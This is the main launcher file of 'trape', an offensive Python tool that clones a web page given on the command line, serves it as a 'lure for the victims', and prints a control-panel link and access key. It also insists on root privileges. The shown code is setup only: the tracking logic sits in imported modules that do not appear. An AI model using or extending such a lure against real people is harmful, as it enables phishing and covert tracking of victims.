#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/boxug/trape
#
# Copyright 2017 by boxug / <hey@boxug.com>
#**
import time
import json
import optparse
import socket
import sys
import os
from core.utils import utils

class Trape(object):
	def __init__(self):
		self.name_trape = "trape"
		self.stats_path = "s" + utils.generateToken(6)
		self.home_path = "h" + utils.generateToken(18)
		self.stats_key = utils.generateToken(24)
		self.date_start = time.strftime("%Y-%m-%d - %H:%M:%S")
		parser = optparse.OptionParser("python" + " " + "%prog -u <<Url>> -p <<Port>>", version="1.0.0")
		parser.add_option('-u', '--url', dest='url', help='Put the web page url to clone')
		parser.add_option('-p', '--port', dest='port', help='Insert your port')

		(options, args) = parser.parse_args()

		mandatories = ['url', 'port']
		for m in mandatories:
		    if not options.__dict__[m]:
		        parser.print_help()
		        exit(-1)

		if utils.checkPort(int(options.port)) == False:
			utils.Go("\n" + utils.Color['white'] + "[" + utils.Color['redBold'] + "x" + utils.Color['white'] + "]" + " " + "The port:" + " " + utils.Color['whiteBold'] + options.port + utils.Color['white'] + " " + "is not available, It was previously used (" + utils.Text['underline'] + "Use another port" + utils.Text['end'] + ")" + "\n")
			exit(-1)

		self.app_port = int(options.port)
		self.url_to_clone = str(options.url)
		self.victim_path = options.url.replace("http://", "").replace("https://", "")

	# Design principal of the header of sack
	def header(self):
		utils.banner()
		utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + "+" + utils.Color['white'] + "--" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Lure for the victims: " + utils.Color['blue'] + 'http://127.0.0.1:' + str(self.app_port) + '/' + self.victim_path)
		utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + "+" + utils.Color['white'] + "--" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel Link: " + utils.Color['blue'] + "http://127.0.0.1:" + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)
		utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + "+" + utils.Color['white'] + "--" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Your Access key: " + utils.Color['blue'] + self.stats_key + "\n\n" + utils.Color['white'])
		utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + ">" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + "Start time:" + " " + utils.Color['white'] + self.date_start)
		utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "¡" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Waiting for the victims to fall..." + "\n")

	# Important: in the process of use is possible that will ask for the root
	def rootConnection(self):
		if sys.platform != "win32" and sys.platform != "cygwin":
			if os.getuid() != 0:
				utils.Go("\t" + "--------------------")
				utils.Go("\t" + "> Welcome to " + self.name_trape + " <")
				utils.Go("\t" + "--------------------")
				utils.Go(utils.Color["blueBold"] + "[*] " + utils.Color["white"] + "Hello " + utils.Color["greenBold"] + os.uname()[1] + "," + utils.Color["white"] + " I hope you enjoy my role")
				utils.Go(utils.Color["redBold"] + "[x] " + utils.Color["white"] + "You must run in mode " + utils.Color["whiteBold"] + "root" + utils.Color["white"] + " to be able to operate.")
				exit(0)

	# Detect operating system, to compose the compatibility			
	def loadCheck(self):
		utils.checkOS()
		
    # the main file (trape.py)
	def main(self):
		import core.sockets